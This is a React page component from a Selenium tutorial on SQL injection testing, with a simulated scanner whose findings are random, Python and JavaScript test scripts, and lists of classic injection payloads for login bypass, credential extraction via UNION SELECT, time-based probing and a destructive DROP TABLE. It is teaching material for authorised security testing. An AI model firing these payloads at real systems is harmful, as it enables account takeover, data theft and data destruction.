'use client';

import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { PageHeader } from '@/components/shared/generic-page-header';
import { TopicNavigation } from '@/components/shared/topic-navigation';
import type { Language, Topic } from '@/data/languages';
import { 
  Database,
  AlertTriangle,
  Shield,
  Bug,
  CheckCircle,
  XCircle,
  Info,
  Code,
  Copy,
  Lock,
  RefreshCw,
  Layers,
  Scan,
  ShieldCheck,
  Terminal,
  Clock,
  Key,
} from 'lucide-react';

const SQLInjectionTesting = () => {
  const [copiedCode, setCopiedCode] = useState<string | null>(null);
  const [isScanning, setIsScanning] = useState(false);
  const [vulnerabilityCount, setVulnerabilityCount] = useState(0);
  const [logs, setLogs] = useState<Array<{ timestamp: string; message: string; type: 'info' | 'success' | 'error' | 'warning' }>>([]);

  // Define the current topic and language for navigation
  const currentTopic: Topic = {
    slug: 'sql-injection-testing',
    title: 'SQL Injection Testing',
    explanation: 'Testing for SQL injection vulnerabilities',
    category: '28. Security Testing'
  };

  const language: Language = {
    slug: 'selenium',
    name: 'Selenium',
    description: 'Master the world\'s most powerful browser automation tool',
    topics: []
  };

  const addLog = (message: string, type: 'info' | 'success' | 'error' | 'warning' = 'info') => {
    const timestamp = new Date().toLocaleTimeString();
    setLogs(prev => [...prev, { timestamp, message, type }]);
  };

  const copyToClipboard = async (code: string, codeId: string) => {
    try {
      await navigator.clipboard.writeText(code);
      setCopiedCode(codeId);
      setTimeout(() => setCopiedCode(null), 2000);
      addLog('Code copied to clipboard', 'success');
    } catch (err) {
      addLog('Failed to copy code', 'error');
    }
  };

  const simulateSQLInjectionTest = () => {
    setIsScanning(true);
    addLog('Starting SQL injection scan...', 'info');
    setVulnerabilityCount(0);
    
    const testCases = [
      { endpoint: '/login', payload: "'", result: 'SQL syntax error detected' },
      { endpoint: '/search', payload: "1' OR '1'='1", result: 'Authentication bypass possible' },
      { endpoint: '/user/profile', payload: "1; DROP TABLE users--", result: 'Stacked query execution' },
      { endpoint: '/api/products', payload: "1' UNION SELECT username,password FROM users--", result: 'Data extraction possible' },
      { endpoint: '/admin/dashboard', payload: "1' AND SLEEP(5)--", result: 'Time-based injection detected' }
    ];

    testCases.forEach((test, index) => {
      setTimeout(() => {
        const isVulnerable = Math.random() > 0.6; // 40% chance of vulnerability
        
        if (isVulnerable) {
          addLog(`🚨 VULNERABILITY: ${test.endpoint} - ${test.result}`, 'error');
          setVulnerabilityCount(prev => prev + 1);
        } else {
          addLog(`✅ SECURE: ${test.endpoint}`, 'success');
        }
        
        if (index === testCases.length - 1) {
          setIsScanning(false);
          addLog(`Scan complete! Found ${vulnerabilityCount + (isVulnerable ? 1 : 0)} vulnerabilities`, 'warning');
        }
      }, (index + 1) * 800);
    });
  };

  useEffect(() => {
    addLog('SQL Injection Testing tool ready', 'info');
  }, []);

  const simpleCodeExample = `# Python SQL Injection Testing with Selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

def test_sql_injection(driver, url, param):
    """Simple SQL injection test"""
    payloads = [
        "'",                    # Basic injection
        "1' OR '1'='1",       # Boolean-based
        "1' UNION SELECT NULL--", # Union-based
        "1' AND SLEEP(5)--"   # Time-based
    ]
    
    vulnerabilities = []
    
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        driver.get(test_url)
        
        # Check for SQL errors in page source
        page_source = driver.page_source.lower()
        sql_errors = ['sql syntax', 'mysql_fetch', 'ora-', 'postgresql query failed']
        
        for error in sql_errors:
            if error in page_source:
                vulnerabilities.append({
                    'payload': payload,
                    'error': error,
                    'url': test_url
                })
                print(f"SQL Injection found: {payload}")
                break
    
    return vulnerabilities

# Usage
driver = webdriver.Chrome()
vulns = test_sql_injection(driver, "https://example.com", "id")
print(f"Found {len(vulns)} vulnerabilities")
driver.quit()`;

  const jsCodeExample = `// JavaScript SQL Injection Testing
const { Builder, By } = require('selenium-webdriver');

async function testSQLInjection(driver, baseUrl, paramName) {
    const payloads = [
        "'",                    // Basic injection
        "1' OR '1'='1",       // Boolean-based  
        "1' UNION SELECT NULL--", // Union-based
        "1' AND SLEEP(5)--"   // Time-based
    ];
    
    const vulnerabilities = [];
    
    for (const payload of payloads) {
        const testUrl = \`\${baseUrl}?\${paramName}=\${encodeURIComponent(payload)}\`;
        await driver.get(testUrl);
        
        const pageSource = await driver.getPageSource();
        const sqlErrors = ['sql syntax', 'mysql_fetch', 'ora-', 'postgresql query failed'];
        
        for (const error of sqlErrors) {
            if (pageSource.toLowerCase().includes(error)) {
                vulnerabilities.push({
                    payload: payload,
                    error: error,
                    url: testUrl
                });
                console.log(\`SQL Injection found: \${payload}\`);
                break;
            }
        }
    }
    
    return vulnerabilities;
}

// Usage
(async () => {
    const driver = await new Builder().forBrowser('chrome').build();
    const vulns = await testSQLInjection(driver, 'https://example.com', 'id');
    console.log(\`Found \${vulns.length} vulnerabilities\`);
    await driver.quit();
})();`;

  const injectionTypes = [
    {
      title: 'Error-Based',
      description: 'Forces database errors to reveal information',
      icon: AlertTriangle,
      payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, version(), 0x7e))--",
      severity: 'High'
    },
    {
      title: 'Union-Based', 
      description: 'Uses UNION to extract data from other tables',
      icon: Database,
      payload: "1' UNION SELECT username,password FROM users--",
      severity: 'Critical'
    },
    {
      title: 'Boolean-Based',
      description: 'Infers data through true/false conditions',
      icon: CheckCircle,
      payload: "1' AND (SELECT COUNT(*) FROM users) > 0--",
      severity: 'High'
    },
    {
      title: 'Time-Based',
      description: 'Uses delays to infer information',
      icon: Clock,
      payload: "1' AND SLEEP(5)--",
      severity: 'High'
    }
  ];

  const essentialPayloads = [
    { category: 'Basic', payloads: ["'", '"', "\\\\", "%27", "%22"] },
    { category: 'Authentication', payloads: ["admin'--", "' OR '1'='1", "' OR 1=1--"] },
    { category: 'Data Extraction', payloads: ["1' UNION SELECT NULL--", "1' UNION SELECT @@version--"] },
    { category: 'Advanced', payloads: ["1' AND SLEEP(5)--", "'; DROP TABLE users--"] }
  ];

  const preventionMethods = [
    {
      title: 'Parameterized Queries',
      description: 'Use prepared statements instead of string concatenation',
      icon: ShieldCheck,
      example: 'PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");'
    },
    {
      title: 'Input Validation',
      description: 'Validate and sanitize all user inputs',
      icon: Lock,
      example: 'if (!preg_match("/^[a-zA-Z0-9]*$/", $input)) { reject(); }'
    },
    {
      title: 'ORM Frameworks',
      description: 'Use Object-Relational Mapping tools',
      icon: Database,
      example: 'User.findById(id) // ORM handles SQL safely'
    },
    {
      title: 'Least Privilege',
      description: 'Use minimal database permissions',
      icon: Key,
      example: 'GRANT SELECT, INSERT ON app.users TO webapp_user;'
    }
  ];

  return (
    <div className="w-full px-4 py-8 space-y-8">
      <PageHeader
        title="SQL Injection Testing"
        description="Simple and effective SQL injection vulnerability testing with Selenium"
        icon={Database}
        colorTheme="red"
      />

      {/* What is SQL Injection */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <AlertTriangle className="w-5 h-5" />
            <span>What is SQL Injection?</span>
          </CardTitle>
          <CardDescription>
            Understanding the #1 web security vulnerability
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="prose prose-sm max-w-none dark:prose-invert">
            <p className="text-base leading-relaxed">
              <strong>SQL Injection</strong> allows attackers to execute malicious SQL statements that can 
              bypass authentication, steal sensitive data, modify databases, and even take control of the entire database server.
            </p>
            
            <div className="bg-red-50 dark:bg-red-900/20 border-l-4 border-red-500 p-4 my-4">
              <p className="text-sm font-medium text-red-800 dark:text-red-200">
                🚨 SQL Injection is #1 on OWASP Top 10. Testing for it is essential for web security.
              </p>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Interactive Scanner */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <Scan className="w-5 h-5" />
            <span>SQL Injection Scanner</span>
          </CardTitle>
          <CardDescription>
            Interactive vulnerability detection tool
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="flex items-center space-x-4">
            <Button
              onClick={simulateSQLInjectionTest}
              disabled={isScanning}
              className="flex items-center space-x-2"
            >
              {isScanning ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  <span>Scanning...</span>
                </>
              ) : (
                <>
                  <Bug className="w-4 h-4" />
                  <span>Start SQL Injection Scan</span>
                </>
              )}
            </Button>
            <Badge variant={vulnerabilityCount > 0 ? "destructive" : "default"}>
              {vulnerabilityCount} Vulnerabilities Found
            </Badge>
          </div>

          {/* Scan Log */}
          <div className="bg-gray-50 dark:bg-gray-800 rounded-lg p-4 h-48 overflow-y-auto">
            <div className="flex items-center justify-between mb-2">
              <h4 className="font-medium text-sm">Scan Results</h4>
              <Button
                size="sm"
                variant="ghost"
                onClick={() => setLogs([])}
              >
                Clear
              </Button>
            </div>
            <div className="space-y-1">
              {logs.map((log, index) => (
                <div key={index} className="flex items-start space-x-2 text-xs">
                  <span className="text-gray-500 dark:text-gray-400 font-mono">{log.timestamp}</span>
                  <span className={`flex items-center space-x-1 ${
                    log.type === 'success' ? 'text-green-600' : 
                    log.type === 'error' ? 'text-red-600' : 
                    log.type === 'warning' ? 'text-yellow-600' : 'text-blue-600'
                  }`}>
                    {log.type === 'success' && <CheckCircle className="w-3 h-3" />}
                    {log.type === 'error' && <XCircle className="w-3 h-3" />}
                    {log.type === 'warning' && <AlertTriangle className="w-3 h-3" />}
                    {log.type === 'info' && <Info className="w-3 h-3" />}
                    <span>{log.message}</span>
                  </span>
                </div>
              ))}
              {logs.length === 0 && (
                <div className="text-gray-400 dark:text-gray-500 text-center py-4">
                  Click "Start SQL Injection Scan" to begin testing.
                </div>
              )}
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Injection Types */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <Layers className="w-5 h-5" />
            <span>SQL Injection Types</span>
          </CardTitle>
          <CardDescription>
            Understanding different attack vectors
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {injectionTypes.map((type, index) => {
              const Icon = type.icon;
              return (
                <div key={index} className="border rounded-lg p-4">
                  <div className="flex items-center space-x-3 mb-3">
                    <Icon className="w-6 h-6 text-red-600" />
                    <div>
                      <h4 className="font-semibold">{type.title}</h4>
                      <Badge variant={type.severity === 'Critical' ? 'destructive' : 'secondary'} className="text-xs">
                        {type.severity}
                      </Badge>
                    </div>
                  </div>
                  <p className="text-sm text-gray-600 dark:text-gray-300 mb-3">
                    {type.description}
                  </p>
                  <div className="bg-gray-50 dark:bg-gray-800 p-2 rounded">
                    <code className="text-xs font-mono">{type.payload}</code>
                  </div>
                </div>
              );
            })}
          </div>
        </CardContent>
      </Card>

      {/* Essential Payloads */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <Code className="w-5 h-5" />
            <span>Essential SQL Injection Payloads</span>
          </CardTitle>
          <CardDescription>
            Must-have payloads for testing
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {essentialPayloads.map((category, index) => (
              <div key={index} className="border rounded-lg p-4">
                <h4 className="font-semibold mb-3">{category.category}</h4>
                <div className="space-y-2">
                  {category.payloads.map((payload, i) => (
                    <div key={i} className="bg-gray-50 dark:bg-gray-800 p-2 rounded">
                      <code className="text-xs font-mono">{payload}</code>
                    </div>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>

      {/* Simple Code Examples */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <Terminal className="w-5 h-5" />
            <span>Simple Code Examples</span>
          </CardTitle>
          <CardDescription>
            Easy-to-implement testing code
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="border rounded-lg">
            <div className="bg-gray-50 dark:bg-gray-800 px-4 py-2 border-b flex items-center justify-between">
              <span className="font-medium">Python</span>
              <Button
                size="sm"
                variant="ghost"
                onClick={() => copyToClipboard(simpleCodeExample, 'python')}
              >
                {copiedCode === 'python' ? (
                  <CheckCircle className="w-4 h-4 text-green-600" />
                ) : (
                  <Copy className="w-4 h-4" />
                )}
              </Button>
            </div>
            <pre className="p-4 text-sm overflow-x-auto bg-gray-100 dark:bg-gray-900 text-gray-900 dark:text-gray-100">
              <code>{simpleCodeExample}</code>
            </pre>
          </div>

          <div className="border rounded-lg">
            <div className="bg-gray-50 dark:bg-gray-800 px-4 py-2 border-b flex items-center justify-between">
              <span className="font-medium">JavaScript</span>
              <Button
                size="sm"
                variant="ghost"
                onClick={() => copyToClipboard(jsCodeExample, 'javascript')}
              >
                {copiedCode === 'javascript' ? (
                  <CheckCircle className="w-4 h-4 text-green-600" />
                ) : (
                  <Copy className="w-4 h-4" />
                )}
              </Button>
            </div>
            <pre className="p-4 text-sm overflow-x-auto bg-gray-100 dark:bg-gray-900 text-gray-900 dark:text-gray-100">
              <code>{jsCodeExample}</code>
            </pre>
          </div>
        </CardContent>
      </Card>

      {/* Prevention Methods */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <Shield className="w-5 h-5" />
            <span>Prevention Methods</span>
          </CardTitle>
          <CardDescription>
            How to prevent SQL injection attacks
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {preventionMethods.map((method, index) => {
              const Icon = method.icon;
              return (
                <div key={index} className="border rounded-lg p-4">
                  <div className="flex items-center space-x-3 mb-3">
                    <Icon className="w-6 h-6 text-green-600" />
                    <h4 className="font-semibold">{method.title}</h4>
                  </div>
                  <p className="text-sm text-gray-600 dark:text-gray-300 mb-3">
                    {method.description}
                  </p>
                  <div className="bg-gray-50 dark:bg-gray-800 p-2 rounded">
                    <code className="text-xs font-mono">{method.example}</code>
                  </div>
                </div>
              );
            })}
          </div>
        </CardContent>
      </Card>

      {/* Important Notes */}
      <Alert>
        <AlertTriangle className="w-4 h-4" />
        <AlertTitle>Important Testing Notes</AlertTitle>
        <AlertDescription>
          <ul className="list-disc list-inside space-y-1 text-sm">
            <li>Only test on applications you own or have permission to test</li>
            <li>Never test on production systems - use a testing environment</li>
            <li>Use non-destructive payloads that won't harm the database</li>
            <li>Document findings and follow responsible disclosure</li>
          </ul>
        </AlertDescription>
      </Alert>

      <TopicNavigation currentTopic={currentTopic} language={language} />
    </div>
  );
};

export default SQLInjectionTesting;
